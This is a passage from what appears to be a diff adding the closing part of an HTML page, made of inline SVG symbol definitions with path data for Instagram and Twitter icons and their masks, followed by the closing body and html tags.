+          d="M46.91,25.816c-0.073-1.597-0.326-2.687-0.697-3.641c-0.383-0.986-0.896-1.823-1.73-2.657c-0.834-0.834-1.67-1.347-2.657-1.73c-0.954-0.371-2.045-0.624-3.641-0.697C36.585,17.017,36.074,17,32,17s-4.585,0.017-6.184,0.09c-1.597,0.073-2.687,0.326-3.641,0.697c-0.986,0.383-1.823,0.896-2.657,1.73c-0.834,0.834-1.347,1.67-1.73,2.657c-0.371,0.954-0.624,2.045-0.697,3.641C17.017,27.415,17,27.926,17,32c0,4.074,0.017,4.585,0.09,6.184c0.073,1.597,0.326,2.687,0.697,3.641c0.383,0.986,0.896,1.823,1.73,2.657c0.834,0.834,1.67,1.347,2.657,1.73c0.954,0.371,2.045,0.624,3.641,0.697C27.415,46.983,27.926,47,32,47s4.585-0.017,6.184-0.09c1.597-0.073,2.687-0.326,3.641-0.697c0.986-0.383,1.823-0.896,2.657-1.73c0.834-0.834,1.347-1.67,1.73-2.657c0.371-0.954,0.624-2.045,0.697-3.641C46.983,36.585,47,36.074,47,32S46.983,27.415,46.91,25.816z M44.21,38.061c-0.067,1.462-0.311,2.257-0.516,2.785c-0.272,0.7-0.597,1.2-1.122,1.725c-0.525,0.525-1.025,0.85-1.725,1.122c-0.529,0.205-1.323,0.45-2.785,0.516c-1.581,0.072-2.056,0.087-6.061,0.087s-4.48-0.015-6.061-0.087c-1.462-0.067-2.257-0.311-2.785-0.516c-0.7-0.272-1.2-0.597-1.725-1.122c-0.525-0.525-0.85-1.025-1.122-1.725c-0.205-0.529-0.45-1.323-0.516-2.785c-0.072-1.582-0.087-2.056-0.087-6.061s0.015-4.48,0.087-6.061c0.067-1.462,0.311-2.257,0.516-2.785c0.272-0.7,0.597-1.2,1.122-1.725c0.525-0.525,1.025-0.85,1.725-1.122c0.529-0.205,1.323-0.45,2.785-0.516c1.582-0.072,2.056-0.087,6.061-0.087s4.48,0.015,6.061,0.087c1.462,0.067,2.257,0.311,2.785,0.516c0.7,0.272,1.2,0.597,1.725,1.122c0.525,0.525,0.85,1.025,1.122,1.725c0.205,0.529,0.45,1.323,0.516,2.785c0.072,1.582,0.087,2.056,0.087,6.061S44.282,36.48,44.21,38.061z M32,24.297c-4.254,0-7.703,3.449-7.703,7.703c0,4.254,3.449,7.703,7.703,7.703c4.254,0,7.703-3.449,7.703-7.703C39.703,27.746,36.254,24.297,32,24.297z M32,37c-2.761,0-5-2.239-5-5c0-2.761,2.239-5,5-5s5,2.239,5,5C37,34.761,34.761,37,32,37z M40.007,22.193c-0.994,0-1.8,0.806-1.8,1.8c0,0.994,0.806,1.8,1.8,1.8c0.994,0,1.8-0.806,1.8-1.8C41.807,22.999,41.001,22.193,40.007,22.193z" />
+      </symbol>
+      <symbol id="instagram-mask" viewBox="0 0 64 64">
+        <path
+          d="M43.693,23.153c-0.272-0.7-0.597-1.2-1.122-1.725c-0.525-0.525-1.025-0.85-1.725-1.122c-0.529-0.205-1.323-0.45-2.785-0.517c-1.582-0.072-2.056-0.087-6.061-0.087s-4.48,0.015-6.061,0.087c-1.462,0.067-2.257,0.311-2.785,0.517c-0.7,0.272-1.2,0.597-1.725,1.122c-0.525,0.525-0.85,1.025-1.122,1.725c-0.205,0.529-0.45,1.323-0.516,2.785c-0.072,1.582-0.087,2.056-0.087,6.061s0.015,4.48,0.087,6.061c0.067,1.462,0.311,2.257,0.516,2.785c0.272,0.7,0.597,1.2,1.122,1.725s1.025,0.85,1.725,1.122c0.529,0.205,1.323,0.45,2.785,0.516c1.581,0.072,2.056,0.087,6.061,0.087s4.48-0.015,6.061-0.087c1.462-0.067,2.257-0.311,2.785-0.516c0.7-0.272,1.2-0.597,1.725-1.122s0.85-1.025,1.122-1.725c0.205-0.529,0.45-1.323,0.516-2.785c0.072-1.582,0.087-2.056,0.087-6.061s-0.015-4.48-0.087-6.061C44.143,24.476,43.899,23.682,43.693,23.153z M32,39.703c-4.254,0-7.703-3.449-7.703-7.703s3.449-7.703,7.703-7.703s7.703,3.449,7.703,7.703S36.254,39.703,32,39.703z M40.007,25.793c-0.994,0-1.8-0.806-1.8-1.8c0-0.994,0.806-1.8,1.8-1.8c0.994,0,1.8,0.806,1.8,1.8C41.807,24.987,41.001,25.793,40.007,25.793z M0,0v64h64V0H0z M46.91,38.184c-0.073,1.597-0.326,2.687-0.697,3.641c-0.383,0.986-0.896,1.823-1.73,2.657c-0.834,0.834-1.67,1.347-2.657,1.73c-0.954,0.371-2.044,0.624-3.641,0.697C36.585,46.983,36.074,47,32,47s-4.585-0.017-6.184-0.09c-1.597-0.073-2.687-0.326-3.641-0.697c-0.986-0.383-1.823-0.896-2.657-1.73c-0.834-0.834-1.347-1.67-1.73-2.657c-0.371-0.954-0.624-2.044-0.697-3.641C17.017,36.585,17,36.074,17,32c0-4.074,0.017-4.585,0.09-6.185c0.073-1.597,0.326-2.687,0.697-3.641c0.383-0.986,0.896-1.823,1.73-2.657c0.834-0.834,1.67-1.347,2.657-1.73c0.954-0.371,2.045-0.624,3.641-0.697C27.415,17.017,27.926,17,32,17s4.585,0.017,6.184,0.09c1.597,0.073,2.687,0.326,3.641,0.697c0.986,0.383,1.823,0.896,2.657,1.73c0.834,0.834,1.347,1.67,1.73,2.657c0.371,0.954,0.624,2.044,0.697,3.641C46.983,27.415,47,27.926,47,32C47,36.074,46.983,36.585,46.91,38.184z M32,27c-2.761,0-5,2.239-5,5s2.239,5,5,5s5-2.239,5-5S34.761,27,32,27z" />
+      </symbol>
+      <symbol id="twitter-icon" viewBox="0 0 64 64">
+        <path
+          d="M48,22.1c-1.2,0.5-2.4,0.9-3.8,1c1.4-0.8,2.4-2.1,2.9-3.6c-1.3,0.8-2.7,1.3-4.2,1.6 C41.7,19.8,40,19,38.2,19c-3.6,0-6.6,2.9-6.6,6.6c0,0.5,0.1,1,0.2,1.5c-5.5-0.3-10.3-2.9-13.5-6.9c-0.6,1-0.9,2.1-0.9,3.3 c0,2.3,1.2,4.3,2.9,5.5c-1.1,0-2.1-0.3-3-0.8c0,0,0,0.1,0,0.1c0,3.2,2.3,5.8,5.3,6.4c-0.6,0.1-1.1,0.2-1.7,0.2c-0.4,0-0.8,0-1.2-0.1 c0.8,2.6,3.3,4.5,6.1,4.6c-2.2,1.8-5.1,2.8-8.2,2.8c-0.5,0-1.1,0-1.6-0.1c2.9,1.9,6.4,2.9,10.1,2.9c12.1,0,18.7-10,18.7-18.7 c0-0.3,0-0.6,0-0.8C46,24.5,47.1,23.4,48,22.1z" />
+      </symbol>
+      <symbol id="twitter-mask" viewBox="0 0 64 64">
+        <path
+          d="M0,0v64h64V0H0z M44.7,25.5c0,0.3,0,0.6,0,0.8C44.7,35,38.1,45,26.1,45c-3.7,0-7.2-1.1-10.1-2.9 c0.5,0.1,1,0.1,1.6,0.1c3.1,0,5.9-1,8.2-2.8c-2.9-0.1-5.3-2-6.1-4.6c0.4,0.1,0.8,0.1,1.2,0.1c0.6,0,1.2-0.1,1.7-0.2 c-3-0.6-5.3-3.3-5.3-6.4c0,0,0-0.1,0-0.1c0.9,0.5,1.9,0.8,3,0.8c-1.8-1.2-2.9-3.2-2.9-5.5c0-1.2,0.3-2.3,0.9-3.3 c3.2,4,8.1,6.6,13.5,6.9c-0.1-0.5-0.2-1-0.2-1.5c0-3.6,2.9-6.6,6.6-6.6c1.9,0,3.6,0.8,4.8,2.1c1.5-0.3,2.9-0.8,4.2-1.6 c-0.5,1.5-1.5,2.8-2.9,3.6c1.3-0.2,2.6-0.5,3.8-1C47.1,23.4,46,24.5,44.7,25.5z" />
+      </symbol>
+    </svg>
+
+  </body>
+
+  </html>
